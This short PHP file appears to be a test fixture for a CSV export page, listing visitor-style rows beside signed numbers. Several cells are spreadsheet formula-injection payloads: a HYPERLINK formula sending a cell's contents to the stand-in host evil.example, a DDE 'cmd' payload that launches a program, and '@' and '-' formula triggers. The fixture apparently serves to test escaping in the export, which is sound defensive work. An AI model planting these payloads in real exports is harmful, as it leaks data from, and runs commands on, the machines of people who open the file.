<?php

  // The page format/cells_csv asks for CSV: rows as a guestbook or an order form would
  // store them, from visitors, beside numbers of both signs.

  $cells = [ [ 'name' => '=HYPERLINK("http://evil.example/?"&A1,"open")', 'note' => '+cmd|\' /C calc\'!A0', 'amount' => -12.5 ],
             [ 'name' => '@SUM(A1:A9)',                                     'note' => '-2+3',               'amount' => '-7'  ],
             [ 'name' => 'Alice',                                           'note' => 'a - b',              'amount' => '+3'  ] ];

  $padExpose = [ 'cells' ];

?>
